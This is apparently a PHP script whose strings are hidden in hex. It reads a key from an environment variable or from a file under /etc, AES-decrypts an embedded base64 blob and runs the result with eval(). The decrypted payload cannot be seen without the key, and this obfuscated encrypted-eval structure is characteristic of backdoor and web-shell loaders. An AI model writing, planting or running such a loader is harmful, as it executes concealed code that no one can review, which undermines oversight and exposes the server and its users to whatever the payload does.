<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('s3+um934BNoF7Ty3Qxg8PA==');

$c=base64_decode(

'iTscIrUbL7UXaaLrsgSdqZW64FMuEyes8ePs9wHGj/zXxdK0HwOFkVBymCBhmyTMtZEk+oaCTCRM' .
'w8wIpBi8qLhfUEhlt3eV1THayzCZzGcutfD4q8XjSfcrFitAbVrcpf63DwAO7+TE16KqiLk14rNv' .
'blP5QX7Tu6QYIjthZM/To1EXpW9GFcB7ak9xZIDeEg27yVynPHXUyAeMAE/4IjgkSN5HiXsIX2OL' .
'+XsbRfLEGkphzqTR6U2ev2C5kbO4T8smvb3rFafBo2zNHFc7tnzu55fLS99CT+4ePKrZflRkz8lJ' .
'TPie7/zAv9I6odluDw/72LeLn3fU1LAOwps0WqD7oqI0zUezHC5WnO/v6CA6YeEf2IRtWBnczNJG' .
'8wBCga/45sz3JKj/F8E8QmXisr8fRH43unwob+i8MIOqsmVLDf+yA0vb1FGayibcoc3fPCa7Igol' .
'7oE/qze/IHYJw5kP+l+qWezARYGb3RbM76HGMfPiN5xSRQa7vJV3Fr3Rgn2kJcUX9ZGcUJ3+fsb2' .
'PqKgclUOsbLp9GBkZkw/5EnyG5xS4kNyhR8rQmi/F6NzHcLemR8ko06oUNGoNuKGA3TTXLgvysO/' .
'QaY06+pe091zLiAoE5KzsYyUbs52wd+d2JoRaDlRqEx7Ci8aTou5YrF3u9R6eq634KnwYayM6l8u' .
'h4OIKTqE/CfcPzauyUsd3xUFbX3BWnMoDE+L5H/XLg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

